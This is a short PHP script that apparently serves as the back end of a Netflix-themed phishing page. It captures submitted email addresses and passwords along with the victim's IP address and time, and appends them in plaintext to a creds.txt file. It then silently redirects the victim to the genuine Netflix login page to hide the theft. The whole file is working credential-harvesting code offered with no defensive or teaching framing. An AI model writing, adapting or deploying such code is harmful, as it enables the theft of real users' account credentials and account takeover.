<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $email = $_POST['email'] ?? 'N/A';
    $password = $_POST['password'] ?? 'N/A';

    // Get client IP address, accounting for proxies/tunnels
    $ip = $_SERVER['REMOTE_ADDR'];
    if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
        $ip = $_SERVER['HTTP_CLIENT_IP'];
    } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $ipList = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);
        $ip = trim(end($ipList));  // Get the last IP in the list
    }

    $time = date("Y-m-d H:i:s");

    // Log credentials
    $logEntry = "[$time] IP: $ip | Email: $email | Password: $password\n";
    file_put_contents("creds.txt", $logEntry, FILE_APPEND | LOCK_EX);

    // (Optional) Log all headers to analyze IP forwarding
    /*
    $headers = json_encode(getallheaders());
    file_put_contents("headers.log", "[$time] Headers: $headers\n", FILE_APPEND | LOCK_EX);
    */

    // Redirect to Netflix
    header("Location: https://www.netflix.com/login");
    exit();
} else {
    http_response_code(403);
    echo "403 Forbidden";
    exit();
}
?>
